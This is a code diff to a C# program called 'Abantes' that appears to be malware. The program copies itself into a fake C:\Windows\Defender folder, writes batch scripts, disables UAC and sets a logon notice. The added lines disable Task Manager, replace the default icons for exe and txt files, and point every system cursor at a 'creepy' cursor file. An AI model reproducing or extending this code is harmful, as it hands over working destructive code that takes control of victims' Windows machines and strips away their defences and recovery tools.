@@ -29,7 +29,16 @@ namespace Abantes
                 Directory.CreateDirectory(@"C:\Windows\Defender");
                 File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
                 File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
+                File.WriteAllBytes(extractPath + "\\cursor.cur", Resources.creepy_mouse);
+                File.WriteAllBytes(extractPath + "\\icon.ico", Resources.icon);
                 File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
+
+                editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
+                editKey.SetValue("", extractPath + "\\icon.ico");
+                editKey.Close();
+                editKey = Registry.ClassesRoot.CreateSubKey(@"exefile\DefaultIcon");
+                editKey.SetValue("", extractPath + "\\icon.ico");
+                editKey.Close();
 
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                 editKey.SetValue("legalnoticecaption", "Important Information");
@@ -45,6 +54,49 @@ namespace Abantes
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                 editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+                editKey.SetValue("DisableTaskMgr", "1");
+                editKey.Close();
+
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("Arrow", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("Hand", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("Wait", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("AppStarting", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("Help", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("UpArrow", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("No", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("SizeWE", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("SizeNWSE", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("SizeNS", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("SizeNESW", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("SizeAll", extractPath + "\\cursor.cur");
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
+                editKey.SetValue("NWPen", extractPath + "\\cursor.cur");
                 editKey.Close();
 
                 Process ScriptProcess = new Process();
